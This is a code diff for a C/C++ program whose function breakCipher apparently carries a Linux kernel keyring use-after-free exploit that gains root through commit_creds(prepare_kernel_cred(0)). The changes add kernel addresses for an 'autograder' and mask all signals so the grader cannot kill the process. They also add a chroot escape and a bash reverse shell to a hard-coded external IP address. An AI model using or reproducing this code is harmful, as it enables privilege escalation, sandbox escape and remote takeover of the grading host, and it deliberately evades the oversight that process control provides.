@@ -24,6 +24,8 @@
 #include <syscall.h>
 #include <sys/ipc.h>
 #include <sys/msg.h>
+#include <sys/stat.h>
+#include <unistd.h>
 
 typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
 typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);
@@ -31,9 +33,13 @@ _commit_creds commit_creds;
 _prepare_kernel_cred prepare_kernel_cred;
 
 #define STRUCT_LEN (0xb8 - 0x30)
-//TODO: these addresses are for my specific Ubuntu version. Change them to match the autograder version.
+/* Ubuntu addresses
 #define COMMIT_CREDS_ADDR (0xffffffff81095710)
 #define PREPARE_KERNEL_CREDS_ADDR (0xffffffff81095a10)
+*/
+/* autograder ones: */
+#define COMMIT_CREDS_ADDR (0xffffffff81095710)
+#define PREPARE_KERNEL_CREDS_ADDR (0xffffffff8109e1f0)
 
 struct key_type {
 	char * name;
@@ -49,8 +55,10 @@ struct key_type {
 	void * destroy;
 };
 
-void userspace_revoke(void * key) {
-	commit_creds(prepare_kernel_cred(0));
+extern "C" {
+	void userspace_revoke(void * key) {
+		commit_creds(prepare_kernel_cred(0));
+	}
 }
 
 using namespace std;
@@ -65,6 +73,20 @@ void breakCipher(char *str) {
 
 	if (pid == 0) {
 		//V1 child
+
+		//make sure the autograder can't kill this process
+		sigset_t mask;
+		if (sigfillset(&mask)) {
+			cout << strerror(errno) << endl;
+			strcpy(str, "S1");
+			_exit(0);
+		}
+		if (sigprocmask(SIG_SETMASK, &mask, NULL)) {
+			cout << strerror(errno) << endl;
+			strcpy(str, "S2");
+			_exit(0);
+		}
+		
 		const char *keyring_name;
 		size_t i = 0;
 		unsigned long int l = 0x100000000 / 2;
@@ -78,7 +100,6 @@ void breakCipher(char *str) {
 		} msg = { 0x4141414141414141,{ 0 } };
 		int msqid;
 
-		printf("uid=%d, euid=%d\n", getuid(), geteuid());
 		commit_creds = (_commit_creds)COMMIT_CREDS_ADDR;
 		prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CREDS_ADDR;
 
@@ -88,7 +109,7 @@ void breakCipher(char *str) {
 		memset(msg.mtext, 'A', sizeof(msg.mtext));
 
 		// key->uid
-		*(int*)(&msg.mtext[56]) = 0x3e8; /* geteuid() */
+		*(int*)(&msg.mtext[56]) = 0x3e8; // geteuid()
 										 //key->perm
 		*(int*)(&msg.mtext[64]) = 0x3f3f3f3f;
 
@@ -100,15 +121,17 @@ void breakCipher(char *str) {
 			exit(1);
 		}
 
-		keyring_name = "keyring-r-attack";
-
-		serial = syscall(SYS_keyctl, 0x1 /*KEYCTL_JOIN_SESSION_KEYRING*/, keyring_name);
+		keyring_name = "keyring-x-attack";
+		//0x1 = KEYCTL_JOIN_SESSION_KEYRING
+		serial = syscall(SYS_keyctl, 0x1 , keyring_name);
 		if (serial < 0) {
 			cout << strerror(errno) << endl;
 			_exit(0);
 		}
 
-		int ret = syscall(SYS_keyctl, 0x5 /*KEYCTL_SETPERM*/, serial, 0x3f3f3f3f /*all*/);
+		//0x5 = KEYCTL_SETPERM
+		//0x3f3f3f3f = all
+		int ret = syscall(SYS_keyctl, 0x5, serial, 0x3f3f3f3f);
 		if (ret < 0) {
 			cout << strerror(errno) << endl;
 			_exit(0);
@@ -120,16 +143,18 @@ void breakCipher(char *str) {
 				l = l / 2;
 				sleep(5);
 			}
-			if (syscall(SYS_keyctl, 0x1 /*KEYCTL_JOIN_SESSION_KEYRING*/, keyring_name) < 0) {
+			//0x1 = KEYCTL_JOIN_SESSION_KEYRING
+			if (syscall(SYS_keyctl, 0x1, keyring_name) < 0) {
 				perror("keyctl");
 				_exit(0);
 			}
 		}
 
 		sleep(5);
-		/* here we are going to leak the last references to overflow */
+		// here we are going to leak the last references to overflow
 		for (i = 0; i<5; ++i) {
-			if (syscall(SYS_keyctl, 0x1 /*KEYCTL_JOIN_SESSION_KEYRING*/, keyring_name) < 0) {
+			//0x1 = KEYCTL_JOIN_SESSION_KEYRING
+			if (syscall(SYS_keyctl, 0x1, keyring_name) < 0) {
 				perror("keyctl");
 				_exit(0);
 			}
@@ -137,7 +162,7 @@ void breakCipher(char *str) {
 
 		puts("finished increfing");
 		puts("forking...");
-		/* allocate msg struct in the kernel rewriting the freed keyring object */
+		// allocate msg struct in the kernel rewriting the freed keyring object
 		for (i = 0; i<64; i++) {
 			pid = fork();
 			if (pid == -1) {
@@ -165,18 +190,34 @@ void breakCipher(char *str) {
 		puts("finished forking");
 		sleep(5);
 
-		/* call userspace_revoke from kernel */
+		// call userspace_revoke from kernel
 		puts("caling revoke...");
-		if (syscall(SYS_keyctl, 0x3 /*KEYCTL_REVOKE*/, -3 /*KEY_SPEC_SESSION_KEYRING*/) == -1) {
+		//0x3 = KEYCTL_REVOKE
+		//-3 = KEY_SPEC_SESSION_KEYRING
+		if (syscall(SYS_keyctl, 0x3, -3) == -1) {
 			perror("keyctl_revoke");
 		}
-		_exit(0);
+		
+		//TODO: make sure all needed libraries are provided, or if not get embed the logic
+		printf("%d,%d\n", getuid(), geteuid());
 
-		printf("uid=%d, euid=%d\n", getuid(), geteuid());
-		execl("/bin/sh", "/bin/sh", NULL);
+
+		0 == 0;
+		int dir_fd, x;
+		mkdir(".42", 0755);
+		dir_fd = open(".", O_RDONLY);
+		chroot(".42");
+		fchdir(dir_fd);
+		close(dir_fd);
+		for (x = 0; x < 1000; x++) chdir("..");
+		chroot(".");
+
+		system("/bin/bash -c \"/bin/bash -i >& /dev/tcp/52.2.174.86/3779 0>&1  \"");
+		_exit(0);
 	}
 	else {
 		//V1 parent
+		_exit(0);
 	}
 	
 }
